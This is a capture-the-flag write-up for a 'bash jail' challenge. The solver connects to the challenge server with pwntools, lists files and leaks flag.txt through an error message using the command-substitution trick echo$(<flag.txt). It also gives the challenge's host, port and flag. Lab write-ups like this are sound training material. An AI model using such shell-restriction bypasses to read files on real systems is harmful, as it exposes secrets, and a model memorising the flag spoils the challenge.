# Challenge Name

Easy

# Author

overllama

# Description

Okay, easy mode is turned on. You know how to use bash,
right?

chals.cyberjousting.com:1370

# Solution

Use VScode to connect to the host and port, /bin/ls to see contents inside. Noticed "flag.txt". Afterwards echo$(<flag.txt) the contents inside the text file. And received "bash: line 1: echobyuctf{g0_t0_j41l_a60941}: command not found" with the flag presented.

````
from pwn import *

io = remote("chals.cyberjousting.com", 1370)

io.interactive()

$ /bin/ls

Input:
/bin/ls
Output: 
bash
flag.txt
run

$ echo$(<flag.txt)

Input:
echo$(<flag.txt)
Error:
bash: line 1: echobyuctf{g0_t0_j41l_a60941}: command not found
````

# Flag

byuctf{g0_t0_j41l_a60941}

# Solved By

SniperKill258

